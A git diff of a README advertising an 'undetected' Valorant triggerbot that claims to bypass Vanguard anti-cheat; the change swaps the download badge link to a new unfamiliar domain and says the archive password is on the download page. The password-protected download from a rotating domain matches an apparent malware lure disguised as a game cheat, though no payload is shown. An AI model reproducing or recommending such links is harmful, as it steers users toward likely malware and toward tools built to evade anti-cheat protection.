@@ -18,7 +18,7 @@ Valorant Triggerbot - undetected cheat for Valorant. Bypasses Vanguard anti-chea
 
 ## Download
 
-[![Download v1.9.0](https://img.shields.io/badge/Download_v1.9.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/valtriggerbot2)
+[![Download v1.9.0](https://img.shields.io/badge/Download_v1.9.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/valtriggerbot2)
 
 > The archive password is shown on the download page.
 
